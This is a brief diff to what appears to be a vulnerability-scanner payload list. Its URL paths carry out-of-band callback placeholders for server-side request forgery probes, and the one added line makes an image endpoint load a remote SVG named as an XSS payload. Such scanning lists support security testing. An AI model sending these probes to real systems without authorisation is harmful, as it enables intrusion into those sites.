@@ -62,3 +62,4 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /proxy?url=http://{{interactsh-url}}
 /apply/index.php?url=http://{{interactsh-url}}
 /unified-console.html
+/_image?href=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg
